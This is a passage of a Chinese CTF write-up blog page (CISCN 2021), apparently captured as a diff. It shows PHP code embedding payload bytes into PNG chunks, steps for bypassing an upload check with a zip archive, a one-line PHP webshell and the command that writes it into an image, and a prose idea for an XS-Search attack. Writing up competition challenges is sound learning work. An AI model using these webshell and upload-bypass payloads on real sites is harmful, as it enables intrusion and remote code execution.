+           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
+           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
+           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
+ 
+ 
+ 
+<span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+ 
+<span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
+   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
+   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="p">}</span>
+ 
+<span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>了解这三点后，直接进行利用：</p>
+<p>因为在比赛中，测试发现PLTE块还是被一定程度的改变，直接用上文的exp写IDAT块，但是题目ban了一堆函数，加上<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>只能单参数执行，并不能拿到flag，所以打算直接静态探究一下PLTE块被转换的规律：</p>
+<p>先生成插入了<code>1234567890abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_+</code>字符串的txt，与含有<code>#define xxx</code>文件一同压缩，注意压缩时选择<code>仅存储文件</code>相关的选项，这样不会对<code>#define xxx</code>进行修改，上传后可以正常绕过<code>getimagesize</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518232158057.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518232158057.png, https://gitee.com/leonsec/images/raw/master/image-20210518232158057.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518232158057.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518232158057.png"
+        title="image-20210518232158057" /></p>
+<p>压缩修改成<code>test.zİp</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518232334869.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518232334869.png, https://gitee.com/leonsec/images/raw/master/image-20210518232334869.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518232334869.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518232334869.png"
+        title="image-20210518232334869" /></p>
+<p>上传成功后解压：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518232502980.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518232502980.png, https://gitee.com/leonsec/images/raw/master/image-20210518232502980.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518232502980.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518232502980.png"
+        title="image-20210518232502980" /></p>
+<p>访问test.txt保存到本地查看：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518232656893.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518232656893.png, https://gitee.com/leonsec/images/raw/master/image-20210518232656893.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518232656893.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518232656893.png"
+        title="image-20210518232656893" /></p>
+<p>发现如图的位置改变，于是算了一下长度，刚好能写GET的一句话，中间其余字符用注释符注释即可：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518232857509.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518232857509.png, https://gitee.com/leonsec/images/raw/master/image-20210518232857509.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518232857509.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518232857509.png"
+        title="image-20210518232857509" /></p>
+<p>最后需要<code>/*</code>或者<code>?&gt;</code>注释剩余字符或者闭合都行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.\poc_png.py -p &#34;*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+&#34; -o test1.txt .\indexcolor.png
+</code></pre></td></tr></table>
+</div>
+</div><p>按上述步骤上传解压后，成功写入一句话：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210518233440358.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210518233440358.png, https://gitee.com/leonsec/images/raw/master/image-20210518233440358.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210518233440358.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210518233440358.png"
+        title="image-20210518233440358" /></p>
+<p>蚁剑连上找到flag即可</p>
+<h3 id="babyblog">babyblog</h3>
+<p>吐槽一下，这个题的bot没有队列，而且单线程，请求半天才给一个回显，凌晨bot被阻塞了，叫客服也没人回，去睡了两小时，起床后有了思路但是来不及了</p>
+<p>虽然没法验证思路对不对<code>:(</code>，但应该没错了，犹豫就会败北</p>
+<p>主要注意他给了个搜索功能，测了一下是对大小写敏感的，正常来说搜索功能是大小写不敏感的，加上<code>templates</code>文件夹下存在模板文件源码泄露，对XSS严格限制了，再加上题目描述，可以想到利用这个搜索功能进行XSLeak，也就是XS-Search，也算侧信道攻击</p>
+<p>参考：<a href="https://xsleaks.dev/docs/attacks/xs-search/" target="_blank" rel="noopener noreffer">XS-Search | XS-Leaks Wiki (xsleaks.dev)</a></p>
+<p>根据题目描述猜测flag就在admin的blog页面，可能是title，也可能是content，不过没有区别，利用搜索功能对页面的检索，逐位爆破，成功返回200，传回vps，未匹配返回302跳转，基于此爆破flag</p>
+<p><code>35C3 CTF</code> 的<code>filemanager</code>题目和这个类似，只不过利用点不同，这里是火狐，那道题利用的是chrome的错误页面<code>chrome-error://chromewebdata/</code></p>
+<p>大概就这么多</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-05-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/ciscn2021-writeup/" data-title="CISCN2021 Writeup" data-via="Le0nsec" data-hashtags="RCE,LFI,XSSearch"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/ciscn2021-writeup/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/ciscn2021-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/ciscn2021-writeup/" data-title="CISCN2021 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/rce/">RCE</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/xssearch/">XSSearch</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" class="prev" rel="prev" title="四叶草安全牛年CTF大赛"><i class="fas fa-angle-left fa-fw"></i>四叶草安全牛年CTF大赛</a>
+            <a href="/golang_scan_tech/" class="next" rel="next" title="Golang开发端口扫描器一些常用技术">Golang开发端口扫描器一些常用技术<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
